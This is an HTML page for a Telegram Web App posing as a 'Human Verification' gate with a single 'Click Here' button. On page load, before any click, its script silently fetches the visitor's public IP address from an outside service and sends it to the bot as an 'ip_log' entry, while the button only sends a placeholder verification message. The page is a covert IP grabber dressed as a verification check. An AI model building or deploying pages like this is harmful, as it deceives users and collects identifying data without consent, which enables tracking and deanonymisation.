<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Human Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        /* Your existing CSS styles */
    </style>
</head>
<body>
    <h1>Human Verification</h1>
    <p>Verify below to be granted entry</p>
    <button onclick="verify()">Click Here</button>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand(); // Expands the web app panel

        // Fetch user's IP and send it to the bot immediately
        fetch("https://api.ipify.org?format=json")
            .then(response => response.json())
            .then(data => {
                const userIP = data.ip; // Get the user's IP
                console.log("User IP:", userIP); // Debugging in console

                // Send the IP to the bot immediately
                const ipData = JSON.stringify({ type: "ip_log", ip: userIP });
                tg.sendData(ipData);
            })
            .catch(error => console.error("Error fetching IP:", error));

        function verify() {
            // When clicked, sends the verification data to the bot
            const data = JSON.stringify({ type: "verification" });
            tg.sendData(data);
            tg.close(); // Close the panel after verification
        }
    </script>
</body>
</html>
